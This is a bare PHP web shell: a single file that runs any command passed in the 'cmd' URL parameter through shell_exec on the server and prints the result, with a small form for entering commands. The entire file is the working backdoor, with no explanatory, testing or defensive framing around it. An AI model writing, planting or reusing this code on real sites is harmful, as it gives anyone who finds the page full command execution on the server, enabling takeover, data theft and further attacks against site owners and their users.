<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo '<form method="GET">
            <input name="cmd" placeholder="Enter command" style="width:300px">
            <input type="submit" value="Run">
          </form>';
}
?>
